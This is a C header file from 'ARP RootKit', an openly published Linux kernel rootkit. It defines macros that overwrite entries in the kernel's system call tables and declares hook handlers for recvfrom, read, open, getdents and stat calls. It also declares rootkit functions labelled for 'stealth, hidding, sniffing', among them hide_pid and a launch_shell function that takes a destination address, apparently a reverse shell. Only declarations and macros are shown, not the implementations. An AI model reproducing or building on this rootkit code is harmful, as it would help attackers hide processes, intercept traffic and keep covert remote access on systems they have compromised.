/***
 *      _  __  __     __
 *     /_) )_) )_)    )_) _   _  _)_ )_/ o _)_
 *    / / / \ /      / \ (_) (_) (_ /  ) ( (_
 *
 *//* License
 *
 * Copyright (c) 2018 Abel Romero Pérez aka D1W0U <abel@abelromero.com>
 *
 * This file is part of ARP RootKit.
 *
 * ARP RootKit is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * ARP RootKit is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with ARP RootKit.  If not, see <http://www.gnu.org/licenses/>.
 *
 *//* Notes
 *
 * Here the hook handlers.
 */

#ifndef HOOKS_H

#include <linux/in.h>
#include <linux/stat.h>

#include "ctl.h"

/*
 * Macros.
 */
#define MAP_FAILED     ((void *) -1)
#define MAX_PATH 4096

/*
 * (Un)Hooking macros.
 */
#define HOOK64(nr, handler) my_sct[nr] = handler
#define HOOK32(nr, handler) my_ia32sct[nr] = handler
#define UNHOOK64(nr) my_sct[nr] = sys_call_table[nr]
#define UNHOOK32(nr) my_ia32sct[nr] = ia32_sys_call_table[nr]

/*
 * Type definitions.
 */
struct linux_dirent {
	unsigned long	d_ino;
	unsigned long	d_off;
	unsigned short	d_reclen;
	char		d_name[1];
};

struct linux_dirent64 {
	u64		d_ino;
	s64		d_off;
	unsigned short	d_reclen;
	unsigned char	d_type;
	char		d_name[0];
};

struct stat64 {
	unsigned long long st_dev;	/* Device.  */
	unsigned long long st_ino;	/* File serial number.  */
	unsigned int	st_mode;	/* File mode.  */
	unsigned int	st_nlink;	/* Link count.  */
	unsigned int	st_uid;		/* User ID of the file's owner.  */
	unsigned int	st_gid;		/* Group ID of the file's group. */
	unsigned long long st_rdev;	/* Device number, if device.  */
	unsigned long long __pad1;
	long long	st_size;	/* Size of file, in bytes.  */
	int		st_blksize;	/* Optimal block size for I/O.  */
	int		__pad2;
	long long	st_blocks;	/* Number 512-byte blocks allocated. */
	int		st_atime;	/* Time of last access.  */
	unsigned int	st_atime_nsec;
	int		st_mtime;	/* Time of last modification.  */
	unsigned int	st_mtime_nsec;
	int		st_ctime;	/* Time of last status change.  */
	unsigned int	st_ctime_nsec;
	unsigned int	__unused4;
	unsigned int	__unused5;
};

/*
 * Hook handlers.
 */
extern asmlinkage int my_recvfrom64(int fd, void __user * ubuf, size_t size, unsigned int flags, struct sockaddr __user *addr, int __user *addr_len);
extern asmlinkage int my_read64(int fd, void __user *buf, size_t len);
extern asmlinkage int my_reboot64(int magic1, int magic2, unsigned int cmd, void *arg);
extern asmlinkage int my_open64(const char *path, int flags, umode_t mode);
extern asmlinkage int my_openat64(int dfd, const char *path, int flags, umode_t mode);
extern asmlinkage long my_getdents64(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
extern asmlinkage long my_getdents6464(unsigned int fd, struct linux_dirent64 __user *dirent,  unsigned int count);
extern asmlinkage long my_fstatat6464(int dfd, const char __user *filename, struct stat __user *statbuf, int flag);
extern asmlinkage long my_lstat6464(const char __user *filename, struct stat64 __user *statbuf);
extern asmlinkage long my_stat6464(const char __user *filename, struct stat64 __user *statbuf);
extern asmlinkage long my_newfstatat64(int dfd, const char __user *filename, struct stat __user *statbuf, int flag);
extern asmlinkage long my_newlstat64(const char __user *filename, struct __old_kernel_stat __user *statbuf);
extern asmlinkage long my_newstat64(const char __user *filename, struct __old_kernel_stat __user *statbuf);
extern asmlinkage long my_lstat64(const char __user * filename, struct __old_kernel_stat __user * statbuf);
extern asmlinkage long my_stat64(const char __user *filename, struct __old_kernel_stat __user *statbuf);

/* compat hook handlers */
extern asmlinkage int my_recvfrom32(int fd, void __user * ubuf, size_t size, unsigned int flags, struct sockaddr __user *addr, int __user *addr_len);
extern asmlinkage int my_read32(int fd, void __user *buf, size_t len);

/*
 * RK Kernel funcs: used for stealth, hidding, sniffing, etc.
 */
extern bool check_pid_in_path(const char *path);
extern void *alloc_umem(size_t len);
extern long free_umem(void *ptr, size_t len);
extern int launch_shell(struct sockaddr_in dest);
extern int arprk_ctl(struct arprk_ctl *ctl);
extern int hide_pid(pid_t pid);
extern int unhide_pid(pid_t pid);

#define HOOKS_H

#endif
